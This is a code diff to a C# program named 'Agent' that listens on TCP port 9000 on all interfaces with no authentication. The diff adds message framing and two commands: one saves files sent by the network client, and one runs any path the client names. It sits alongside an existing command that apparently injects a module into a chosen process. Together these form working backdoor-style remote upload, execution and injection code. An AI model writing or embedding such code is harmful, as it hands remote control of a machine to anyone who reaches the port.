@@ -1,5 +1,7 @@
 using System;
 using System.Diagnostics;
+using System.IO;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -33,22 +35,58 @@ class Agent {
         Console.WriteLine("attached");
     }
 
+    static byte[] ReadExact(NetworkStream s, int n) {
+        var buf = new byte[n];
+        int off = 0;
+        while (off < n) {
+            int r = s.Read(buf, off, n - off);
+            if (r <= 0) throw new IOException("stream closed");
+            off += r;
+        }
+        return buf;
+    }
+
+    static int ReadInt32BE(NetworkStream s) {
+        var hdr = ReadExact(s, 4);
+        return (hdr[0] << 24) | (hdr[1] << 16) | (hdr[2] << 8) | hdr[3];
+    }
+
     static void Main() {
-        var listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Any, 9000);
+        var uploadDir = Path.Combine(AppContext.BaseDirectory, "uploads");
+        Directory.CreateDirectory(uploadDir);
+        var listener = new TcpListener(System.Net.IPAddress.Any, 9000);
         listener.Start();
         Console.WriteLine("agent up");
         while (true) {
             var c = listener.AcceptTcpClient();
             var s = c.GetStream();
-            var hdr = new byte[4]; s.Read(hdr, 0, 4);
-            var n = BitConverter.ToInt32(hdr, 0);
-            var body = new byte[n]; s.Read(body, 0, n);
-            var json = Encoding.UTF8.GetString(body);
-            if (json.Contains("\"attach\"")) {
-                var pid = int.Parse(Regex.Match(json, "\"pid\":(\\d+)").Groups[1].Value);
-                var mod = Regex.Match(json, "\"module\":\"([^\"]+)\"").Groups[1].Value;
-                Attach(pid, mod);
+            try {
+                while (c.Connected) {
+                    int n = ReadInt32BE(s);
+                    var body = ReadExact(s, n);
+                    var json = Encoding.UTF8.GetString(body);
+                    if (json.Contains("\"attach\"")) {
+                        var pid = int.Parse(Regex.Match(json, "\"pid\":(\\d+)").Groups[1].Value);
+                        var mod = Regex.Match(json, "\"module\":\"([^\"]+)\"").Groups[1].Value;
+                        Attach(pid, mod);
+                    } else if (json.Contains("\"upload\"")) {
+                        var name = Regex.Match(json, "\"name\":\"([^\"]+)\"").Groups[1].Value;
+                        var size = int.Parse(Regex.Match(json, "\"size\":(\\d+)").Groups[1].Value);
+                        var data = ReadExact(s, size);
+                        var safe = Path.GetFileName(name);
+                        var dest = Path.Combine(uploadDir, safe);
+                        File.WriteAllBytes(dest, data);
+                        Console.WriteLine("uploaded " + dest);
+                    } else if (json.Contains("\"run\"")) {
+                        var path = Regex.Match(json, "\"path\":\"([^\"]+)\"").Groups[1].Value;
+                        Process.Start(new ProcessStartInfo(path) { UseShellExecute = true });
+                        Console.WriteLine("ran " + path);
+                    }
+                }
+            } catch (Exception e) {
+                Console.WriteLine("client err: " + e.Message);
             }
+            c.Close();
         }
     }
 }
